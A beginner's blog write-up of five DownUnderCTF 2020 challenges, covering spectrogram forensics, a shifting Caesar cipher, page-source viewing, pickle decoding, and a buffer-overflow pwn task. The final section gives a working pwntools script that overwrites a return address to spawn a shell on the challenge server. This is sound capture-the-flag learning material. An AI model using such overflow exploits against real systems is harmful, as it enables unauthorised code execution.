---
title: DownUnderCTF2020 writeups
date: 2020-09-09 00:00:00 Z
layout: post
---
This is my first CTF event. I did not do well and I only solved a few. The following is my writeup for the ones I did solve. 
### forensics - On the spectrum:
A .wav music file is given. As the name suggested, it is about the spectrum of the music. I had no idea what does it means and did some search online. I found this youtube video was helpful: https://www.youtube.com/watch?v=LrwtGliuvIk
I used a tool called Sonic Visualiser, using the following spectrogram settings:

![]({{ site.url }}/assets/DUCTF_spec1.png)

The flag is shown below:

![]({{ site.url }}/assets/DUCTF_spec2.png)

### crypto - rot-i:
This one gives us an encrypted message:

```
Ypw'zj zwufpp hwu txadjkcq dtbtyu kqkwxrbvu! Mbz cjzg kv IAJBO{ndldie_al_aqk_jjrnsxee}. Xzi utj gnn olkd qgq ftk ykaqe uei mbz ocrt qi ynlu, etrm mff'n wij bf wlny mjcj :).
```
The question is named `rot-i` so chances are this is a substitution cipher. However, it is not a simple one. We know that `IAJBO` stands for `DUCTF`. After calculating the alphabet places differences, we find a pattern, `I` is 5 spaces after `D`, `U` is 6 spaces after `A` (wrapped around) etc.. Then a simple python script could do:

```python
letters = 'abcdefghijklmnopqrstuvwxyz'
encrypted = 'IAJBO{ndldie_al_aqk_jjrnsxee}'
i = 5
letters_list = [x for x in letters]
for j in range(len(encrypted)):
	en = encrypted[j]
	if en.lower() in letters_list:
		index = letters_list.index(en.lower()) - i - j
		print(letters_list[index % 26],end="")
	else:
		print(en,end="")
```
### web - Leggos
It’s a page with an image of a bottle of Leggos sauce. Although the web-page disabled right-click to prevent we see the source code. Burp Suite can be used to see the source code.

![]({{ site.url }}/assets/DUCTF_leggos1.png)

### misc - In a pickle
A file named data is given. From the description, the chances of this is in a pickle format is high. I used the following code to extract the information:

```python
import pandas as pd

p_dict = pd.read_pickle('data')
print(p_dict)
```
Run it and the following is returned:

![]({{ site.url }}/assets/DUCTF_pickle.png)

It is indeed in pickle format and it contains a flag. Now the question is what’s the content? It all contains numbers and these numbers are in the range of unicode for English characters. 

```python
result = ''
for key,value in p_dict.items():
	if key < 4 or key == 23: 
		result += value
		continue
	elif key == 24:
		continue
	else:
		result += chr(value)
print(result)
```
This code gives me the flag. 
### pwn - Shell this!
A simple buffer overflow problem. We overflow the buffer and overwrite the return address using the win function address.

```python
from pwn import *
context(arch='amd64', os='linux')

PROGNAME = "./shellthis"
REMOTEIP = "chal.duc.tf"
REMOTEPORT = 30002

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

win_addr = elf.symbols["get_shell"]
payload = b''
payload += b'A' * 56
payload += p64(win_addr)
p.sendline(payload)
p.interactive()
```
